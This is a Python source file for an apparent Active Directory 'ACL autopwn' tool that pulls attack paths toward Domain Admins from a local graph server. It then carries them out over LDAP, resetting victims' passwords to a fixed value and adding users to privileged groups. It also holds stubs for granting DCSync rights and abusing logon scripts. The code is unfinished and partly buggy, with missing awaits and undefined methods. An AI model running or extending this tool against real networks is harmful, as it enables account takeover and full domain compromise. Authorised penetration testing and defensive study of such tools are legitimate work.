import asyncio
import json
import traceback
import pprint

import aiohttp
from msldap.commons.url import MSLDAPURLDecoder
from aiosmb.commons.connection.url import SMBConnectionURL


class ACLPwn:
	def __init__(self, url, ldap_url, smb_url, graph_id, start_user_sid = None):
		self.jd_url = url
		self.ldap_url = ldap_url
		self.smb_url = smb_url
		self.graph_id = graph_id
		self.start_user_sid = start_user_sid
		self.domainsids = []
		self.dagroups = []
		self.newpass = 'Passw0rd!1'
		self.objcache = {}
		self.current_user = None

		self.is_graph_loaded = False

	def get_ldap(self):
		return MSLDAPURLDecoder(self.ldap_url)

	def get_smb(self):
		return SMBConnectionURL(self.smb_url)

	async def load_graph(self):
		try:
			print('Asking server to load graph data to memory...')
			async with aiohttp.ClientSession() as session:
				async with session.post('%s/graph?adids=%s' % (self.jd_url, self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					await resp.text()

			self.is_graph_loaded = True
			return True, None
		except Exception as e:
			return False, e
	
	async def get_path_owned_da(self):
		try:
			async with aiohttp.ClientSession() as session:
				async with session.get('%s/graph?adids=%s' % (self.jd_url,self.graph_id)) as resp:
					if resp.status != 200:
						raise Exception('get_path_owned_dafailed! Status: %s' % resp.status)
					await resp.text()

		except Exception as e:
			return False, e

		
	async def get_path(self, src_sid, dst_sid, exclude = ['hasSession']):
		try:
			url = '%s/graph/%s/query/path?src=%s&dst=%s&format=%s' % (self.jd_url,self.graph_id, src_sid, dst_sid, 'path')
			if len(exclude) > 0:
				exclude = '%2C'.join(exclude)
			url += '&exclude=%s' % exclude
			print(url)
			async with aiohttp.ClientSession() as session:
				async with session.get(url) as resp:
					print(resp.status)
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					data = await resp.text()
			print(data)
			res = json.loads(data)
			pprint.pprint(res)
			return res, None
		except Exception as e:
			return False, e
	
	async def get_domainsids(self):
		try:
			async with aiohttp.ClientSession() as session:
				async with session.get('%s/graph/%s/getdomainsids/' % (self.jd_url,self.graph_id)) as resp:
					print(resp.status)
					if resp.status != 200:
						raise Exception('Loading graphid failed! Status: %s' % resp.status)
					body = await resp.text()
					print(body)
					self.domainsids = json.loads(body)
			
			for dsid in self.domainsids:
				if dsid.endswith('-') is False:
					dsid += '-'
				self.dagroups.append(dsid+'512')

			return True, None
		except Exception as e:
			return False, e

	async def get_objinfo(self, sid, stype):
		try:
			if sid not in self.objcache:
				#http://127.0.0.1:5000/group/1/by_sid/S-1-5-21-4136613964-2812260436-2179565534-2643
				async with aiohttp.ClientSession() as session:
					async with session.get('%s/%s/%s/by_sid/%s' % (self.jd_url, stype, self.graph_id, sid)) as resp:
						print(resp.status)
						if resp.status != 200:
							raise Exception('Loading graphid failed! Status: %s' % resp.status)
						body = await resp.text()
						print(body)
						self.objcache[sid] = json.loads(body)
			
			return self.objcache[sid], None
		except Exception as e:
			return False, e

	async def get_dn(self, sid, stype, ad_id):
		try:
			userinfo, err = await self.get_objinfo(sid, stype)
			if err is not None:
				raise err
			
			if 'dn' in userinfo:
				return userinfo['dn'], None
			if 'distinguishedName' in userinfo:
				return userinfo['distinguishedName'], None

		except Exception as e:
			return False, e

	async def change_user(self, sid, ad_id = 1):
		try:
			print('Changing user...')
			if sid not in self.objcache:
				_, err = self.get_objinfo(sid, 'user')
				if err is not None:
					raise err
			self.current_user = self.objcache[sid]['sAMAccountName']

		except Exception as e:
			return False, e
	
	async def changepw_user(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(dst_sid, 'user', ad_id)
			if err is not None:
				raise err

			ldapclient = self.get_ldap().get_client()
			print('Changing user %s \'s password to %s' % (user_dn, self.newpass))
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.change_password(user_dn, self.newpass)
			if err is not None:
				raise err
			
			print('User password changed!')

		except Exception as e:
			print('Failed to change password for user %s' % user_dn)
			return False, e
	
	async def add_user_to_group(self, src_sid, dst_sid, ad_id = 1):
		try:
			
			user_dn, err = await self.get_dn(src_sid, 'user', ad_id)
			if err is not None:
				raise err
			
			group_dn, err = await self.get_dn(dst_sid, 'group', ad_id)
			if err is not None:
				raise err

			ldapclient = self.get_ldap().get_client()
			print('Adding user %s \'s to group %s' % (user_dn, group_dn))
			_, err = await ldapclient.connect()
			if err is not None:
				raise err
			
			_, err = await ldapclient.add_user_to_group(user_dn, group_dn)
			if err is not None:
				raise err
			
			print('User password changed!')

		except Exception as e:
			print('Failed to add user %s to group %s' % (user_dn, group_dn))
			return False, e
	
	async def genericall_user(self):
		#password reset
		pass

	async def genericall_group(self):
		#add user to group
		pass
	
	#genericall/genericwrite/write on computer: resource based constrained

	async def writeproperty_group(self):
		#add user to group
		pass

	async def self_group(self):
		#add user to group
		pass
	
	async def writeowner_group(self):
		#change the owner of the group to the given user
		pass

	async def genericwrite_user(self):
		# can change some attributes, scriptpath attr will load a script on next logon to the user
		pass

	async def add_dcsync(self, user_dn):
		#assigns dcsync rights to the given user
		pass

	async def build_chain(self, paths):
		try:
			# breaking up the path to individual steps, filtering the ones which are feasible, and selecting one
			# TODO: some improvement on the selection rpcess
			print('build_chain')
			print()
			paths = sorted(paths, key=len) #favouring shorter paths
			links = []
			for path in paths:
				print('<<<<<<<<<<<<< NEXT >>>>>>>>>>>>>>>>>>>>>>>')
				print(path)
				i = 0
				link = []
				while i < len(path):
					if path[i+1] != 'member':
						link.append((path[i], path[i+1], path[i+2]))
						print((path[i], path[i+1], path[i+2]))
						i += 2
					else:
						if len(path[i:]) >= 4:
							link.append((path[i], path[i+3], path[i+4]))
							print((path[i], path[i+3], path[i+4]))
						i += 4

				links.append(link)
			
			print('Processing links')
			print(len(links))
			selected_actions = None
			for link in links:
				if selected_actions is not None:
					break
				actions = []
				for action in link:
					src_sid = action[0][0]
					src_type = action[0][1]
					atype = action[1].lower()
					dst_sid = action[2][0]
					dst_type = action[2][1]
					
					if atype == 'user-force-change-password':
						if dst_type == 'user':
							actions.append(self.changepw_user(src_sid, dst_sid))
							actions.append(self.change_user(dst_sid))
						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break 

					elif atype in ['addmember', 'extendedrightall']:
						if dst_type == 'group':
							actions.append(self.add_user_to_group(src_sid, dst_sid))
						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break 
					
					elif atype in ['dcsync', 'getchangesall']:
						continue
					
					elif atype in ['writedacl', 'genericall', 'genericwrite', 'owns']:
						if dst_type == 'group':
							if atype in ['writedacl', 'owns']:
								#add_addmember_privs
								#actions.append(self.add_user_to_group(src_sid, dst_sid))
								print('1111111111111111')
							actions.append(self.add_user_to_group(src_sid, dst_sid))
						
						elif dst_type == 'domain':
							print('22222222222222')
							#actions.append(self.add_user_to_group(src_sid, dst_sid))

						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break

					elif atype == 'writeowner':
						if dst_type == 'group':
							actions.append(self.write_owner(src_sid, dst_sid))
							actions.append(self.add_addmember_privs(src_sid, dst_sid))
							actions.append(self.add_user_to_group(src_sid, dst_sid))

						elif dst_type == 'domain':
							print('22222222222222')
							#actions.append(self.write_owner(src_sid, dst_sid))
							#actions.append(self.add_domain_sync(src_sid, dst_sid))
							#

						else:
							print('Action %s not supported on %s' % (atype, dst_type))
							break

					
	
				else:
					selected_actions = actions

			if selected_actions is None:
				raise Exception('No action found which would yield domain admin rights.')
			
			for action in actions:
				_, err = await action
				if err is not None:
					raise err
			
			print('Actions succeeded we should be DA now!')



			
			return True, None
		except Exception as e:
			return False, e

	async def run(self):
		try:
			if self.is_graph_loaded is False:
				_, err = await self.load_graph()
				if err is not None:
					raise err
			
			if len(self.domainsids) == 0:
				_, err = await self.get_domainsids()
				if err is not None:
					raise err
			
			if self.start_user_sid is not None:
				paths = []
				for dasid in self.dagroups:
					res, err = await self.get_path(self.start_user_sid, dasid)
					if err is not None:
						raise err
					paths += res


			else:
				paths, err = await self.get_path_owned_da()
				if err is not None:
					raise err
				
			chain, err = await self.build_chain(paths)
			if err is not None:
				raise err
			


			return True, None
		except Exception as e:
			traceback.print_exc()
			return False, e


def main():
	import argparse

	parser = argparse.ArgumentParser(description='acl autopwn')
	parser.add_argument('url', default='http://127.0.0.1:5000', help = 'server listen ip')
	parser.add_argument('ldapurl', help = 'server listen port')
	parser.add_argument('smburl', help = 'server listen ip')
	parser.add_argument('graphid', default = 1, type=int, help = 'graphid')
	parser.add_argument('-u', '--user-sid', help = 'Start user SID')

	args = parser.parse_args()

	ap = ACLPwn(args.url, args.ldapurl, args.smburl, args.graphid, args.user_sid)

	asyncio.run(ap.run())

if __name__ == '__main__':
	main()